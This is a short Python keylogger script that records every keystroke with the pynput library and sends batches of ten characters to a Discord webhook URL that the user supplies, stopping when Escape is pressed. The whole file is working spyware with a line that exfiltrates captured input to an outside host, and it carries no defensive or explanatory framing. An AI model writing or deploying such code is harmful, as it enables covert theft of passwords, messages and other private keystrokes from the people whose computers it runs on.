import requests
from pynput import keyboard

discord_webhook_url = 'Enter Your Url Here......'


keylogs = ""


def send_log_to_discord(log_message):
    data = {
        'content': log_message
    }
    
    response = requests.post(discord_webhook_url, data=data)
    
    if response.status_code == 204:
        print("Message sent successfully to Discord")
    else:
        print(f"Failed to send message: {response.status_code}, {response.text}")


def on_press(key):
    global keylogs
    
    try:
        keylogs += key.char  
    except AttributeError:
        keylogs += f" [{str(key)}] " 
  
    if len(keylogs) >= 10:
        send_log_to_discord(keylogs)
        keylogs = ""  


def on_release(key):
    if key == keyboard.Key.esc:
        return False 


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
